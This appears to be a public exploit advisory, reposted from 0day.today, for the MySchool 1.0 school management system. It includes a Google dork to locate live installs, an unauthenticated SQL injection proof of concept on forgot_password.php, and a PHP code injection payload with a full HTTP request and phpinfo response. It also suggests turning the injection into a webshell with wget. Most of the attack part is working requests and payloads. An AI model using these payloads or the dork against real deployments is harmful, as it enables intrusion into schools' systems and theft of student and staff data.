@@ -1,0 +1,151 @@
+id: 39890
+date: 01/30/2025
+title: MySchool 1.0 SQL Injection / Code Injection / XSS / CSRF Vulnerabilities
+author: bRpsd
+cves: 
+
+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
+ .:. Exploit Title > MySchool System - Multiple Vulnerabilities
+
+.:. Google Dorks .:.
+inurl:web/teacher_app
+
+
+.:. Date:Jan 20, 2025
+.:. Exploit Author: bRpsd
+.:. Contact: cy[at]live.no
+.:. Vendor -> https://myschool-system.com/
+.:. Vendor has been notified and has released patches
+.:. Affected Version: 1.0
+.:. Tested on > macOS [*nix Darwin Kernel], on local xampp
+.:. Big thanks to wa-3, Telegram: @wa0_3
+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
+
+
+ #############
+ |DESCRIPTION|
+ #############
+"MySchool is a multi-purpose online school management software, an innovative, powerful and easy-to-use interface used by hundreds of educational institutions such as schools, colleges, universities...etc.
+- With the passage of time, new technologies occur in managing the educational process, so it is important for educational institutions to manage all the data and work in a professional manner to save both time and money.
+- MySchool has been used in many educational institutions in Egypt and the Gulf countries since 2007.
+We are constantly developing our programs to provide the best solutions and services to our customers. As a company, we are well known to the customers we serve, but we want to go beyond our current customer base to potential customers from schools, colleges and institutes and increase awareness of the MySchool program worldwide.
+- My School is the best school management system. We have developed a system that is required by all education systems around the world."
+
+
+
+
+
+
+Vulnerability 1: Unauthenticated SQL Injection
+Types: boolean-based blind,error-based, time-based blind
+Path: localhost/forgot_password.php
+Vul Parameter: User [POST]
+Vulnerable Code:
+#################################################################################################
+if ($_SERVER['REQUEST_METHOD']== "POST") {
+      $Res = mysqli_query($GLOBALS["___mysqli_ston"], "SELECT * FROM users where User ='$User' ");
+#################################################################################################
+
+Proof of concept:
+POST http://localhost/forgot_password.php
+User='
+
+Response Error:
+Fatal error: Uncaught mysqli_sql_exception: You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ''''' at line 1 in /forgot_password.php:38 Stack trace: #0 /forgot_password.php(38): mysqli_query() #1 {main} thrown in /forgot_password.php on line 38
+
+NOTE: This isn't the only SQLi, there's plenty in the system Im too lazy to list them all
+Example: /ajax/get_grades.php?schoolId=2'&yearId=24
+===========================================================================================
+
+
+
+
+Vulnerability 2: Authenticated Server Side Code Injection - PHP Code Injection
+Note: Authentication can be easily acquired from the former SQLi
+Path: localhost/btn_01.php
+Vul Parameter: Grade_ID [GET]
+Vul Parameter2: Subject_ID [GET]
+Payload Used: ";phpinfo();$var="
+Possible payload for RCE: file_put_contents combined with wget to have a webshell
+Vulnerable code:
+$data = array($MemberActive, $Year_List_Calc_St, $Sub_Level, $CP_Type, $success, $Division_ID, $Room_ID, $Grade_ID, $Student_Group_ID, $S_User, $Sub_UserID);
+return ($data);
+
+if (!$success) {
+    if ($MS_Option['cacheEnabled1']) {
+        $today = date("Y-m-d");
+        $cacheFactor = $today . "-" . $S_UserName . "-" . $Original_User . "-" . $S_Password . "-" . $_SESSION['Sub_Level'];
+        $htmlCacheFileName = md5($cacheFactor);
+        if (file_exists("cache/login/$htmlCacheFileName")) {
+            $fileContent2 = file_get_contents("cache/login/$htmlCacheFileName");
+            eval('$xl = ' . $fileContent2 . ';');
+        }
+    }
+}
+
+
+Proof of concept:
+
+POST https://localhost/btn_01.php?CurrentLine=1&page_no=1&sort=ID&Page_ID=15340&Grade_ID=%22%3Bphpinfo%28%29%3B%24var%3D%22&Subject_ID=&stopEnablePanel=1 HTTP/1.1
+host: localhost
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:132.0) Gecko/20100101 Firefox/132.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Content-Type: multipart/form-data; boundary=---------------------------56011178726845606972928094726
+Content-Length: 555
+Origin: https://localhost
+Connection: keep-alive
+Referer: https://localhost/cp
+Cookie: PHP84SESSID=b14675e2e1fecf65008c200e665c743e
+Sec-Fetch-Dest: empty
+Sec-Fetch-Mode: cors
+Sec-Fetch-Site: same-origin
+-----------------------------56011178726845606972928094726
+Content-Disposition: form-data; name="skipLastVisited"
+
+undefined
+-----------------------------56011178726845606972928094726
+Content-Disposition: form-data; name="Location_CP_Type"
+
+undefined
+-----------------------------56011178726845606972928094726
+Content-Disposition: form-data; name="subMenuId"
+
+undefined
+-----------------------------56011178726845606972928094726
+Content-Disposition: form-data; name="do"
+
+view
+-----------------------------56011178726845606972928094726--
+
+
+
+Response:
+HTTP/1.1 200 OK
+Date: Wed, 29 Jan 2025 15:19:00 GMT
+Server: Apache
+X-Powered-By: PHP/8.4.3
+X-XSS-Protection: 0
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate
+Pragma: no-cache
+Upgrade: h2
+Connection: Upgrade, Keep-Alive
+Vary: Accept-Encoding
+Keep-Alive: timeout=5, max=100
+Content-Type: text/html; charset=utf-8
+content-length: 373447
+
+<title>PHP 8.4.3 - phpinfo()</title><meta name="ROBOTS" content="NOINDEX,NOFOLLOW,NOARCHIVE" /></head>
+<body><div class="center">
+<table>
+<tr class="h"><td>
+<a href="https://www.php.net/"><h1 class="p">PHP Version 8.4.3</h1>
+</td></tr>
+</table>
+<table>...
+==========================================================================================
+
+There is also CSRF,XSS,External Redirect but I don't see them as a real threat to be honest.
+
+#  0day.today [2025-01-31]  #
